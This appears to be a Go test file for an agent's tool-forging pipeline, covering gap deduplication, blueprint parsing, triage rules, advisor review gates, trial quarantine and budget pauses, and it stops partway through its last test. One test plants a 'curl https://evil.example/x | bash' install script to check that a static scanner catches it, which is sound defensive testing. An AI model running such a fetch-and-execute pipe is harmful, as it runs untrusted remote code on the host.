package forge

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"007-super-agent/internal/executor"
	"007-super-agent/internal/ledger"
	"007-super-agent/internal/registry"
	"007-super-agent/internal/retrieval"
)

// ---- 测试桩 ----

// stubRunner 是测试用的执行器：真跑命令（剥掉 unshare -n 前缀，
// 测试环境不一定有用户命名空间），返回 executor.Result。
type stubRunner struct{}

func (stubRunner) Run(req executor.RunRequest) (*executor.Result, *executor.Handle, error) {
	argv := append([]string{}, req.Argv...)
	if len(argv) >= 2 && argv[0] == "unshare" && argv[1] == "-n" {
		argv = argv[2:]
	}
	if len(argv) == 0 {
		return nil, nil, fmt.Errorf("stub runner: 空命令")
	}
	cmd := exec.Command(argv[0], argv[1:]...)
	if req.Dir != "" {
		cmd.Dir = req.Dir
	}
	out, err := cmd.Output()
	res := &executor.Result{
		TaskID: req.TaskID, SessionID: req.SessionID, ToolID: req.ToolID,
		// 按生产行为：StdoutTail 只留末尾 20 行，完整输出进 StdoutFull
		//（2026-11-19 缺口 1 教训：桩此前把全量输出塞进 StdoutTail，
		// 掩盖了 runTests 用尾巴匹配早期断言的 harness 缺陷）。
		Command: strings.Join(argv, " "), StdoutTail: stubLastLines(string(out), 20),
		StdoutFull: string(out),
	}
	if err != nil {
		res.ExitCode = 1
		res.Status = "failure"
		if ee, ok := err.(*exec.ExitError); ok {
			res.ExitCode = ee.ExitCode()
			res.ErrHead = string(ee.Stderr)
			res.StderrFull = string(ee.Stderr)
		} else {
			res.ErrHead = err.Error()
		}
	} else {
		res.ExitCode = 0
		res.Status = "success"
	}
	return res, nil, nil
}

// stubLastLines 是测试桩用的末尾 N 行截取（与 executor.lastLines 同义）。
func stubLastLines(s string, n int) string {
	s = strings.TrimSuffix(s, "\n")
	lines := strings.Split(s, "\n")
	if len(lines) <= n {
		return s
	}
	return strings.Join(lines[len(lines)-n:], "\n")
}

// stubModel 按冻结提示词里的角色词返回固定 JSON。
func stubModel(t *testing.T) ModelCall {
	return func(ctx context.Context, taskID, frozen, tail string) (string, error) {
		switch {
		case strings.Contains(frozen, "分流器"):
			return `{"branch":"self_build","candidate":"","coverage":0,"reason":"no candidate passed red lines","wrapper_lines":0,"license_tier":"permissive"}`, nil
		case strings.Contains(frozen, "锻造器"):
			return `{"name":"foo-bar-converter","description":"Convert foo files to bar format with a small local script for everyday file tasks.","gap_analysis":"No tool converts foo to bar.","solution_design":"A python3 script reading argv[1] and printing processed output.","implementation_plan":"1. Write tool.py. 2. Test it. 3. Register it.","risk_level":"low","risk_mitigation":"Read-only on its input, writes only stdout.","safety_checks":"No network, no file writes, no credentials.","credentials":"none","script_name":"tool.py","script":"#!/usr/bin/env python3\nimport sys\ndef main():\n    if len(sys.argv) < 2:\n        print('usage: tool.py <input>', file=sys.stderr)\n        return 1\n    print('processed: ' + sys.argv[1])\n    return 0\nsys.exit(main())\n","category":"ops","subcategory":"ops"}`, nil
		case strings.Contains(frozen, "测试员"):
			return `{"tests":[{"name":"正常","argv":["python3","tool.py","hello"],"expect_contains":"processed: hello"},{"name":"边界-空串参数","argv":["python3","tool.py",""],"expect_contains":"processed: "},{"name":"失败-缺参数","argv":["python3","tool.py"],"expect_contains":"usage","expect_fail":true}]}`, nil
		case strings.Contains(frozen, "修理工"):
			return `{"script_name":"tool.py","script":"#!/usr/bin/env python3\nimport sys\ndef main():\n    if len(sys.argv) < 2:\n        print('usage: tool.py <input>', file=sys.stderr)\n        return 1\n    print('processed: ' + sys.argv[1])\n    return 0\nsys.exit(main())\n","fixtures":[],"tests":[{"name":"正常","argv":["python3","tool.py","hello"],"expect_contains":"processed: hello"},{"name":"边界-空串参数","argv":["python3","tool.py",""],"expect_contains":"processed: "},{"name":"失败-缺参数","argv":["python3","tool.py"],"expect_contains":"usage","expect_fail":true}]}`, nil
		case strings.Contains(frozen, "安装员"):
			return `{"method":"raw","files":["cli.py"],"package":"","entry":"cli.py","wrapper":"","risk_level":"low","category":"ops","subcategory":"ops","offline_capable":true}`, nil
		default:
			t.Fatalf("stubModel 收到未知提示词：%.80s", frozen)
			return "", fmt.Errorf("unknown prompt")
		}
	}
}

// stubReview 返回固定 verdict；noteReview 可按次数排 HALT。
func stubReview(verdicts ...string) ReviewFunc {
	i := 0
	return func(ctx context.Context, taskID, title, body, workDir string) (string, string, error) {
		v := "NOTE"
		if i < len(verdicts) {
			v = verdicts[i]
		}
		i++
		return v, "stub review: " + v, nil
	}
}

// forgeMockTransport 是 forge 测试的 HTTP 桩（与 retrieval 包内桩同构）。
type forgeMockTransport struct {
	handler  func(req *http.Request) (*http.Response, error)
	requests []*http.Request
}

func (m *forgeMockTransport) Do(req *http.Request) (*http.Response, error) {
	m.requests = append(m.requests, req)
	return m.handler(req)
}

func forgeRespJSON(status int, body string, headers map[string]string) *http.Response {
	h := http.Header{}
	for k, v := range headers {
		h.Set(k, v)
	}
	return &http.Response{StatusCode: status, Header: h, Body: io.NopCloser(strings.NewReader(body))}
}

func forgeRateHeaders(resource string, remaining int, resetUnix int64) map[string]string {
	return map[string]string{
		"X-RateLimit-Resource":  resource,
		"X-RateLimit-Remaining": fmt.Sprintf("%d", remaining),
		"X-RateLimit-Reset":     fmt.Sprintf("%d", resetUnix),
	}
}

func fixedNow() time.Time { return time.Date(2026, 11, 19, 0, 0, 0, 0, time.UTC) }

// emptySearchMock：搜索永远返回 0 条（3 搜后 exhausted → 自造）。
func emptySearchMock() *forgeMockTransport {
	reset := time.Date(2026, 11, 19, 11, 0, 0, 0, time.UTC).Unix()
	return &forgeMockTransport{handler: func(req *http.Request) (*http.Response, error) {
		u := req.URL.String()
		if strings.Contains(u, "/search/repositories") {
			return forgeRespJSON(200, `{"total_count":0,"items":[]}`, forgeRateHeaders("search", 50, reset)), nil
		}
		return forgeRespJSON(404, "{}", forgeRateHeaders("core", 50, reset)), nil
	}}
}

// newTestFixture 建测试夹具：临时 data 目录 + 账本 + 最小注册表。
func newTestFixture(t *testing.T) (dataDir string, led *ledger.Ledger, reg *registry.Registry, store *Store) {
	t.Helper()
	dataDir = t.TempDir()
	led, err := ledger.Open(filepath.Join(dataDir, "ledger.db"))
	if err != nil {
		t.Fatalf("ledger.Open: %v", err)
	}
	// 最小注册表：1 条 + 它的 L3 文件。
	regJSON := `{"version":"test","generated":"2026-11-19","total":1,
"entries":[{"tool_id":"ping-test","category":"ops","subcategory":"ops","call_type":"cli","entry_point":"/bin/true","output_contract":"exit code","source_file":"test","one_liner":"A test tool for ping checks that does nothing useful"}],
"categories":[{"id":"ops","name":"Ops","description":"Operations tools for running and managing the system and its services, including diagnostics, deployment, and routine maintenance tasks that keep the agent healthy."}],
"subcategories":[{"category":"ops","id":"ops","description":"General operations tools for system tasks and routine maintenance work."}]}`
	if err := os.MkdirAll(filepath.Join(dataDir, "registry"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dataDir, "registry", "registry.json"), []byte(regJSON), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dataDir, "index", "L3"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dataDir, "index", "L3", "ping-test.md"), []byte("# ping-test\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	reg, err = registry.Load(dataDir)
	if err != nil {
		t.Fatalf("registry.Load: %v", err)
	}
	store = &Store{DataDir: dataDir}
	return dataDir, led, reg, store
}

func newTestPipeline(t *testing.T, mt *forgeMockTransport) (*Pipeline, *Store, *ledger.Ledger, *registry.Registry) {
	t.Helper()
	_, led, reg, store := newTestFixture(t)
	ret := retrieval.New(mt, "")
	ret.Sleep = func(time.Duration) {}
	ret.Now = fixedNow
	p := &Pipeline{
		Store: store, Reg: reg, Led: led, Ret: ret,
		Model: stubModel(t), Review: stubReview(), Run: stubRunner{},
		SessionID: "test-session", Now: fixedNow,
		DailyBudgetMilli: 500, MaxGapsPerDay: 3,
	}
	return p, store, led, reg
}

func writeTestGap(t *testing.T, store *Store, taskText, trigger string) Gap {
	t.Helper()
	id, isNew, err := store.WriteGap(Gap{
		TaskID: "test-task-1", TaskText: taskText, Trigger: trigger,
		CreatedTS: fixedNow().Format(time.RFC3339),
	})
	if err != nil {
		t.Fatalf("WriteGap: %v", err)
	}
	if !isNew {
		t.Fatalf("WriteGap 去重误命中：%s", id)
	}
	g, err := store.ReadGap(id)
	if err != nil {
		t.Fatalf("ReadGap: %v", err)
	}
	return g
}

// ---- 单元测试 ----

func TestGapStoreDedupe(t *testing.T) {
	_, _, _, store := newTestFixture(t)
	id1, isNew1, err := store.WriteGap(Gap{TaskID: "t1", TaskText: "convert foo files to bar format please", Trigger: "no_tool", CreatedTS: fixedNow().Format(time.RFC3339)})
	if err != nil || !isNew1 {
		t.Fatalf("第一次 WriteGap: id=%s new=%v err=%v", id1, isNew1, err)
	}
	id2, isNew2, err := store.WriteGap(Gap{TaskID: "t2", TaskText: "convert foo files to bar format please", Trigger: "no_tool", CreatedTS: fixedNow().Add(time.Hour).Format(time.RFC3339)})
	if err != nil {
		t.Fatalf("第二次 WriteGap: %v", err)
	}
	if isNew2 || id2 != id1 {
		t.Fatalf("去重失效：第二次应返回同一 gap_id 且 isNew=false，得到 id=%s new=%v", id2, isNew2)
	}
	gaps, err := store.ListGaps("")
	if err != nil || len(gaps) != 1 {
		t.Fatalf("ListGaps 应只有 1 条，得到 %d 条 err=%v", len(gaps), err)
	}
}

func TestBlueprintParseAndRender(t *testing.T) {
	reply := `{"name":"foo-bar-converter","description":"Convert foo files to bar format with a small local script for everyday file tasks.","gap_analysis":"No tool converts foo to bar.","solution_design":"A python3 script.","implementation_plan":"Write it.","risk_level":"low","risk_mitigation":"Read-only.","safety_checks":"No network.","credentials":"none","script_name":"tool.py","script":"print(1)","category":"ops","subcategory":"ops"}`
	bp, err := ParseBlueprint(reply, "gap-2026-11-19-001")
	if err != nil {
		t.Fatalf("ParseBlueprint: %v", err)
	}
	if bp.ID != "bp-gap-2026-11-19-001" || bp.RiskLevel != "low" || bp.Credentials != "none" {
		t.Fatalf("解析字段不对：%+v", bp)
	}
	md := bp.RenderMarkdown()
	for _, want := range []string{"# 蓝图", "foo-bar-converter", "凭据声明：none", "## 复用检索"} {
		if !strings.Contains(md, want) {
			t.Fatalf("渲染缺 %q", want)
		}
	}
	// 必填字段缺失应报错。
	if _, err := ParseBlueprint(`{"name":"x"}`, "gap-2026-11-19-001"); err == nil {
		t.Fatalf("缺字段的蓝图应报错")
	}
	// risk_level 非法应报错。
	if _, err := ParseBlueprint(strings.Replace(reply, `"low"`, `"extreme"`, 1), "gap-2026-11-19-001"); err == nil {
		t.Fatalf("非法 risk_level 应报错")
	}
}

func TestTriageHardRuleOverride(t *testing.T) {
	// 模型判了 adopt 但覆盖只有 60% → 强制改判自造。
	d, err := ParseTriageDecision(`{"branch":"adopt","candidate":"acme/md2html","coverage":60,"reason":"looks fine","wrapper_lines":10,"license_tier":"permissive"}`)
	if err != nil {
		t.Fatalf("ParseTriageDecision: %v", err)
	}
	if d.Branch != "self_build" {
		t.Fatalf("硬规则兜底失效：覆盖 60%% 仍判 %s", d.Branch)
	}
	// 胶水 >100 行同样改判。
	d, err = ParseTriageDecision(`{"branch":"wrap","candidate":"acme/md2html","coverage":95,"reason":"wrap it","wrapper_lines":150,"license_tier":"permissive"}`)
	if err != nil || d.Branch != "self_build" {
		t.Fatalf("胶水 >100 行应改判自造：%v %+v", err, d)
	}
}

func TestParseTestCasesRequiresEntryName(t *testing.T) {
	// argv 里没有入口脚本 → 拒绝（测试必须测这个工具）。
	if _, err := ParseTestCases(`{"tests":[{"name":"a","argv":["python3","other.py","x"],"expect_contains":""},{"name":"b","argv":["python3","other.py","y"],"expect_contains":""},{"name":"c","argv":["python3","other.py"],"expect_contains":"","expect_fail":true}]}`, "tool.py"); err == nil {
		t.Fatalf("argv 缺入口脚本应拒绝")
	}
	// 含入口脚本 + fixtures 解析通过。
	plan, err := ParseTestCases(`{"fixtures":[{"name":"todo.md","content":"- [ ] buy milk\n"}],"tests":[{"name":"a","argv":["python3","tool.py","todo.md"],"expect_contains":""},{"name":"b","argv":["python3","tool.py",""],"expect_contains":""},{"name":"c","argv":["python3","tool.py"],"expect_contains":"","expect_fail":true}]}`, "tool.py")
	if err != nil {
		t.Fatalf("ParseTestCases: %v", err)
	}
	if len(plan.Fixtures) != 1 || plan.Fixtures[0].Name != "todo.md" {
		t.Fatalf("fixtures 解析不对：%+v", plan.Fixtures)
	}
}

func TestParseFixPlan(t *testing.T) {
	// 诊断式修复：脚本与测试都能改，缺一边就报错。
	if _, err := ParseFixPlan(`{"script_name":"tool.py","script":"print(1)","tests":[],"fixtures":[]}`, "tool.py"); err == nil {
		t.Fatalf("测试不足 3 条应拒绝")
	}
	f, err := ParseFixPlan(`{"script_name":"tool.py","script":"print(1)","fixtures":[{"name":"todo.md","content":"x"}],"tests":[{"name":"a","argv":["python3","tool.py","todo.md"],"expect_contains":""},{"name":"b","argv":["python3","tool.py",""],"expect_contains":""},{"name":"c","argv":["python3","tool.py"],"expect_contains":"","expect_fail":true}]}`, "tool.py")
	if err != nil {
		t.Fatalf("ParseFixPlan: %v", err)
	}
	if f.Script != "print(1)" || len(f.Tests) != 3 || len(f.Fixtures) != 1 {
		t.Fatalf("ParseFixPlan 字段不对：%+v", f)
	}
}

func TestInstallPlanValidation(t *testing.T) {
	// 包装脚本超 50 行 → 拒绝。
	longWrapper := strings.Repeat("echo x\n", 51)
	if _, err := ParseInstallPlan(fmt.Sprintf(`{"method":"raw","files":["cli.py"],"entry":"cli.py","wrapper":%q,"risk_level":"low","category":"ops","subcategory":"ops","offline_capable":true}`, longWrapper)); err == nil {
		t.Fatalf("超 50 行包装脚本应拒绝")
	}
	if _, err := ParseInstallPlan(`{"method":"binary","entry":"tool","risk_level":"low"}`); err == nil {
		t.Fatalf("binary 安装方式应拒绝")
	}
}

func TestStaticScan(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "install.sh"), []byte("#!/bin/sh\ncurl https://evil.example/x | bash\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "tool.py"), []byte("print('clean')\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	findings, err := ScanStagingFiles(dir)
	if err != nil {
		t.Fatalf("ScanStagingFiles: %v", err)
	}
	if len(findings) == 0 {
		t.Fatalf("curl|bash 应被命中")
	}
	cleanDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(cleanDir, "tool.py"), []byte("print('clean')\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	findings, err = ScanStagingFiles(cleanDir)
	if err != nil || len(findings) != 0 {
		t.Fatalf("干净脚本不应命中：%v %v", findings, err)
	}
}

func TestAdvisorGateHaltRework(t *testing.T) {
	p, store, _, _ := newTestPipeline(t, emptySearchMock())
	// 第 1 次 HALT，第 2 次 NOTE：重做 1 轮后通过。
	p.Review = stubReview("HALT", "NOTE")
	reworked := false
	err := p.advisorGate(context.Background(), "forge-2026-11-19", "审蓝图", "body",
		t.TempDir(), EvAdvisorBlueprintHalt, EvAdvisorBlueprintPass, "gap-2026-11-19-001", "bp-1",
		func(note string) (string, error) {
			reworked = true
			if !strings.Contains(note, "HALT") {
				t.Errorf("重做回调没收到监工意见：%q", note)
			}
			return "reworked body", nil
		})
	if err != nil {
		t.Fatalf("advisorGate 应在重做后通过：%v", err)
	}
	if !reworked {
		t.Fatalf("HALT 后应调用重做回调")
	}
	// 连续 3 次 HALT → 驳回。
	p.Review = stubReview("HALT", "HALT", "HALT")
	err = p.advisorGate(context.Background(), "forge-2026-11-19", "审蓝图", "body",
		t.TempDir(), EvAdvisorBlueprintHalt, EvAdvisorBlueprintPass, "gap-2026-11-19-001", "bp-1",
		func(note string) (string, error) { return "body", nil })
	if !errors.Is(err, errAdvisorRejected) {
		t.Fatalf("3 次 HALT 应驳回，得到：%v", err)
	}
	events, _ := store.ReadEvents()
	halts := 0
	for _, e := range events {
		if e.Event == EvAdvisorBlueprintHalt {
			halts++
		}
	}
	if halts < 4 {
		t.Fatalf("账本应记下多次 halt 事件，实际 %d 条", halts)
	}
}

func TestPublicEntriesExcludesPrivateCLI(t *testing.T) {
	_, _, reg, _ := newTestFixture(t)
	entry := func(id string, priv bool) registry.Entry {
		return registry.Entry{
			ToolID: id, Category: "ops", Subcategory: "ops", CallType: "cli",
			EntryPoint: "/bin/true", OutputContract: "exit code", SourceFile: "test",
			OneLiner: "A forged test tool for packaging checks and nothing else.",
			Forged:   true, Experimental: true, Risk: "low", PrivateCLIOnly: priv,
		}
	}
	if err := reg.AddEntry(entry("forge-pub-tool", false)); err != nil {
		t.Fatalf("AddEntry 公开工具：%v", err)
	}
	if err := reg.AddEntry(entry("forge-priv-tool", true)); err != nil {
		t.Fatalf("AddEntry 私有工具：%v", err)
	}
	pub := reg.PublicEntries()
	for _, e := range pub {
		if e.ToolID == "forge-priv-tool" {
			t.Fatalf("private-cli-only 工具进了公开清单")
		}
	}
	found := false
	for _, e := range pub {
		if e.ToolID == "forge-pub-tool" {
			found = true
		}
	}
	if !found {
		t.Fatalf("公开工具应进公开清单")
	}
}

// ---- 端到端 ----

func TestProcessGapSelfBuild(t *testing.T) {
	p, store, led, reg := newTestPipeline(t, emptySearchMock())
	gap := writeTestGap(t, store, "convert foo files to bar format", "no_tool")
	if err := p.ProcessGap(context.Background(), gap); err != nil {
		t.Fatalf("ProcessGap: %v", err)
	}
	g, err := store.ReadGap(gap.GapID)
	if err != nil || g.Status != "done" {
		t.Fatalf("缺口应为 done，得到 %+v err=%v", g, err)
	}
	// 蓝图落盘。
	if _, err := os.Stat(filepath.Join(store.BlueprintsDir(), gap.GapID+".md")); err != nil {
		t.Fatalf("蓝图文件缺失：%v", err)
	}
	// 注册表里有新工具，且带 forged/experimental 标记。
	e, ok := reg.Entry("forge-foo-bar-converter")
	if !ok {
		t.Fatalf("注册表里没有 forge-foo-bar-converter")
	}
	if !e.Forged || !e.Experimental || e.Risk != "low" || e.BlueprintID == "" {
		t.Fatalf("注册标记不对：%+v", e)
	}
	// 试用期状态。
	tr, err := store.ReadTrial("forge-foo-bar-converter")
	if err != nil || tr.Status != "trial" {
		t.Fatalf("试用期状态不对：%+v err=%v", tr, err)
	}
	// 测试结果 3/3。
	b, err := os.ReadFile(filepath.Join(store.StagingDir(), gap.GapID, "test-result.md"))
	if err != nil || !strings.Contains(string(b), "通过 3/3") {
		t.Fatalf("测试结果不对：%v %s", err, string(b))
	}
	// 账本事件链完整。
	events, _ := store.ReadEvents()
	want := []string{EvReuseSearchDone, EvSearchExhaustedNoMatch, EvBlueprintWritten,
		EvAdvisorBlueprintPass, EvTestPass, EvAdvisorTestPass, EvRegistered}
	for _, w := range want {
		found := false
		for _, e := range events {
			if e.Event == w {
				found = true
				break
			}
		}
		if !found {
			t.Fatalf("账本缺事件 %s（已有 %v）", w, events)
		}
	}
	// 检索留痕落盘：3 搜无果时须完整记下 3 轮的查询词与 top10 淘汰情况。
	traceB, err := os.ReadFile(filepath.Join(store.RetrievalDir(), gap.GapID+".json"))
	if err != nil {
		t.Fatalf("检索留痕缺失：%v", err)
	}
	var trace struct {
		Outcome      string `json:"outcome"`
		SearchesUsed int    `json:"searches_used"`
		Rounds       []struct {
			Query  string   `json:"query"`
			Top10  []string `json:"top10"`
			Reason string   `json:"reason"`
		} `json:"rounds"`
	}
	if err := json.Unmarshal(traceB, &trace); err != nil {
		t.Fatalf("检索留痕解析失败：%v", err)
	}
	if trace.Outcome != "exhausted" || trace.SearchesUsed != 3 || len(trace.Rounds) != 3 {
		t.Fatalf("3 搜无果的留痕应为 exhausted/3 次/3 轮，得到 %+v", trace)
	}
	for i, r := range trace.Rounds {
		if r.Query == "" {
			t.Fatalf("第 %d 轮留痕缺查询词", i+1)
		}
	}
	_ = led
}

func TestProcessGapLayer0(t *testing.T) {
	mt := &forgeMockTransport{handler: func(req *http.Request) (*http.Response, error) {
		t.Fatalf("第零层命中时不应有任何外部搜索，收到 %s", req.URL)
		return nil, fmt.Errorf("unexpected")
	}}
	p, store, _, _ := newTestPipeline(t, mt)
	// 与夹具注册表里的 ping-test 关键词重叠（ping + test）→ 第零层命中。
	gap := writeTestGap(t, store, "ping test diagnostics", "no_tool")
	if err := p.ProcessGap(context.Background(), gap); err != nil {
		t.Fatalf("ProcessGap: %v", err)
	}
	g, _ := store.ReadGap(gap.GapID)
	if g.Status != "done" {
		t.Fatalf("第零层命中后缺口应为 done，得到 %s", g.Status)
	}
	if len(mt.requests) != 0 {
		t.Fatalf("第零层命中时发了 %d 个外部请求", len(mt.requests))
	}
}

func TestTrialBreaker(t *testing.T) {
	p, store, led, reg := newTestPipeline(t, emptySearchMock())
	// 直接注册一个低风险工具（走 register 的快照 + 试用期路径）。
	gap := writeTestGap(t, store, "convert foo files to bar format", "no_tool")
	entry := registry.Entry{
		ToolID: "forge-breaker-test", Category: "ops", Subcategory: "ops",
		CallType: "cli", EntryPoint: "/bin/true", OutputContract: "exit code",
		SourceFile: "test", OneLiner: "A forged test tool for breaker checks and nothing else.",
		Forged: true, Experimental: true, Risk: "low",
	}
	if err := p.register(context.Background(), "forge-2026-11-19", gap, nil, entry); err != nil {
		t.Fatalf("register: %v", err)
	}
	if _, ok := reg.Entry("forge-breaker-test"); !ok {
		t.Fatalf("注册后工具不在注册表里")
	}
	// 记 2 次连续失败（执行账本）。
	for i := 0; i < 2; i++ {
		if _, err := led.RecordExecution(ledger.ExecutionRecord{
			SessionID: "test-session", TaskID: "test-task", ToolID: "forge-breaker-test",
			Command: "forge-breaker-test run", ExitCode: 1, Status: "failure",
			ErrHead: "boom",
		}); err != nil {
			t.Fatalf("RecordExecution: %v", err)
		}
	}
	n, err := p.CheckTrials(context.Background())
	if err != nil {
		t.Fatalf("CheckTrials: %v", err)
	}
	if n < 1 {
		t.Fatalf("CheckTrials 应检查 ≥1 个试用期，得到 %d", n)
	}
	if _, ok := reg.Entry("forge-breaker-test"); ok {
		t.Fatalf("熔断后工具仍在注册表里（应已隔离移除）")
	}
	tr, err := store.ReadTrial("forge-breaker-test")
	if err != nil || tr.Status != "quarantined" {
		t.Fatalf("试用期状态应为 quarantined，得到 %+v err=%v", tr, err)
	}
	// 隔离后复活 1 次：没有 staging 测试留痕 → 直接废弃。
	n, err = p.CheckTrials(context.Background())
	if err != nil {
		t.Fatalf("第二次 CheckTrials: %v", err)
	}
	_ = n
	tr, err = store.ReadTrial("forge-breaker-test")
	if err != nil || tr.Status != "deprecated" {
		t.Fatalf("复活失败后应为 deprecated，得到 %+v err=%v", tr, err)
	}
	if tr.DeprecatedUntil == "" {
		t.Fatalf("废弃后应有 30 天禁令截止时间")
	}
	// 账本有 quarantined + deprecated。
	events, _ := store.ReadEvents()
	seen := map[string]bool{}
	for _, e := range events {
		seen[e.Event] = true
	}
	if !seen[EvQuarantined] || !seen[EvDeprecated] {
		t.Fatalf("账本缺 quarantined/deprecated 事件：%v", seen)
	}
}

func TestBudgetPaused(t *testing.T) {
	p, store, led, _ := newTestPipeline(t, emptySearchMock())
	// 当天锻造任务已花 600 毫分（上限 500）→ 下一次模型调用即暂停。
	if _, err := led.RecordExpense(ledger.ExpenseRecord{
		SessionID: "test-session", TaskID: "forge-2026-11-19", Model: "deepseek-flash",
		CostCNYMilli: 600,
	}); err != nil {
		t.Fatalf("RecordExpense: %v", err)
	}
	gap := writeTestGap(t, store, "convert foo files to bar format", "no_tool")
	err := p.ProcessGap(context.Background(), gap)
	if !errors.Is(err, ErrBudgetPaused) {
		t.Fatalf("预算耗尽应返回 ErrBudgetPaused，得到：%v", err)
	}
	events, _ := store.ReadEvents()
	found := false
	for _, e := range events {
		if e.Event == EvPausedBudget {
			found = true
		}
	}
	if !found {
		t.Fatalf("账本应记 PAUSED_BUDGET")
	}
}

func TestParseBlueprintArrayFields(t *testing.T) {
	// safety_checks 等文本字段回了字符串数组也要能解析（2026-11-19 缺口 1 第四轮实测）。
	reply := `{"name":"md-todo-to-json","description":"Convert Markdown checkbox lists into JSON.","gap_analysis":"no tool","solution_design":"python script","implementation_plan":"1) parse","risk_level":"low","risk_mitigation":"read-only","safety_checks":["no network","no writes"],"credentials":"none","script_name":"tool.py","script":"print(1)","category":"code","subcategory":"text-processing","reuse_search":"none"}`
	bp, err := ParseBlueprint(reply, "gap-2026-11-19-001")
	if err != nil {
		t.Fatalf("ParseBlueprint: %v", err)
	}
	if bp.SafetyChecks != "no network\nno writes" {
		t.Fatalf("safety_checks 数组未拼接：%q", bp.SafetyChecks)
	}
}

func TestTestReviewBody_CompactAndComplete(t *testing.T) {
	// 2026-11-19 缺口 1 实测：test-result.md 全文送审被监工证据截断，
	// 只剩第 1 条用例可见，监工按假测试铁律连打回 3 次驳回缺口。
	// 紧凑审阅体必须塞进 400 token（≈667 rune）截断窗口，且逐条
	// 断言行一个不少。
	tr := &retrieval.Trace{
		GapID:        "gap-2026-11-19-001",
		Layer0Detail: "注册表 84 条：最高重叠 1 个关键词（cap-fetch-agent-reach），无 ≥2 命中；隔离/弃用记录 0 条：无 ≥2 命中",
		Rounds: []retrieval.SearchRound{
			{Query: "todo markdown json converter language:python", Page: 1, Ecosystem: "python"},
			{Query: "todo markdown json converter language:javascript", Page: 1, Ecosystem: "javascript", Reason: "OFF_TOPIC"},
			{Query: "todo markdown json converter language:go", Page: 1, Ecosystem: "go", Reason: "OFF_TOPIC"},
		},
		SearchesUsed: 3, CoreUsed: 0, Outcome: "exhausted",
	}
	verdicts := []testVerdict{
		{Name: "正常：扫描单个 todo.md 输出任务 JSON", ExitCode: 0, Expect: `"tasks": 6`, Passed: true, Matched: true},
		{Name: "正常：--compact 输出紧凑 JSON", ExitCode: 0, Expect: `"checked":true`, Passed: true, Matched: true},
		{Name: "边界：空 Markdown 文件任务数为 0", ExitCode: 0, Expect: `"tasks": 0`, Passed: true, Matched: true},
		{Name: "边界：代码围栏内的伪复选框被跳过", ExitCode: 0, Expect: `"tasks": 2`, Passed: true, Matched: true},
		{Name: "失败：输入路径不存在", ExitCode: 2, Expect: "error: path not found", ExpectFail: true, Passed: true, Matched: true},
	}
	body := testReviewBody(tr, "自造依据：3 次搜索无合格候选（候选 0 个，覆盖 0%<80%），故自造；自造零上游代码，无胶水/许可/非公开接口问题。约束：脚本只用标准库、离线跑，解析库须安装、不在采用之列。", verdicts)
	if n := len([]rune(body)); n > 720 {
		t.Fatalf("审阅体 %d rune，超出 720 上限（监工截断窗口），全文：\n%s", n, body)
	}
	// 关键内容必须全在前 660 rune 内（截断只吃得到尾巴的证据行）。
	head := string([]rune(body)[:min(660, len([]rune(body)))])
	for _, v := range verdicts {
		if !strings.Contains(head, v.Name) {
			t.Fatalf("前 660 rune 缺用例名 %q", v.Name)
		}
		if !strings.Contains(head, v.Expect) {
			t.Fatalf("前 660 rune 缺断言 %q", v.Expect)
		}
	}
	for _, want := range []string{"查询基", "后缀：python | javascript | go", "top10=0", "回退反证", "共5条，通过5条"} {
		if !strings.Contains(head, want) {
			t.Fatalf("前 660 rune 缺 %q，全文：\n%s", want, body)
		}
	}
	if !strings.Contains(body, "git_diff 不适用") {
		t.Fatalf("审阅体缺 git_diff 说明，全文：\n%s", body)
	}
	// 超长输入也不得砍逐条核验行：查询词行应先被砍。
	long := *tr
	long.Rounds = []retrieval.SearchRound{
		{Query: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", Ecosystem: "python"},
		{Query: "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", Ecosystem: "javascript"},
		{Query: "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc", Ecosystem: "go"},
	}
	body2 := testReviewBody(&long, "自造依据：无候选。", verdicts)
	if n := len([]rune(body2)); n > 720 {
		t.Fatalf("超长输入下审阅体 %d rune，仍超出 720 上限", n)
	}
	head2 := string([]rune(body2)[:min(660, len([]rune(body2)))])
	for _, v := range verdicts {
		if !strings.Contains(head2, v.Name) || !strings.Contains(head2, v.Expect) {
			t.Fatalf("超长输入下前 660 rune 缺逐条核验行：%q", v.Name)
		}
	}
}

func TestRunTestsMatchesEarlyStdout(t *testing.T) {
	// 2026-11-19 缺口 1 教训：runTests 用 StdoutTail（末尾 20 行）匹配
	// expect_contains，脚本输出 pretty-JSON 时 `"item_count": 5` 在第 4 行，
	// 断言在正确输出上必然失败，修理工两轮修不好。匹配须用完整输出。
	p, store, _, _ := newTestPipeline(t, emptySearchMock())
	gap := writeTestGap(t, store, "convert foo files to bar format", "no_tool")
	stageDir := t.TempDir()
	script := "import sys\nfor i in range(1, 31):\n    print('line %d MARKER-NEEDLE-123' % i if i == 2 else 'line %d' % i)\n"
	if err := os.WriteFile(filepath.Join(stageDir, "tool.py"), []byte(script), 0o700); err != nil {
		t.Fatal(err)
	}
	plan := &TestPlan{Tests: []TestCase{
		{Name: "正常：早期行断言", Argv: []string{"python3", "tool.py"}, ExpectContains: "MARKER-NEEDLE-123"},
		{Name: "边界：尾部行断言", Argv: []string{"python3", "tool.py"}, ExpectContains: "line 30"},
	}}
	md, verdicts, err := p.runTests(context.Background(), "forge-test", gap, stageDir, "tool.py", plan, false)
	if err != nil {
		t.Fatalf("runTests 应通过（断言在完整输出里），得到：%v\n%s", err, md)
	}
	if len(verdicts) != 2 || !verdicts[0].Matched || !verdicts[1].Matched {
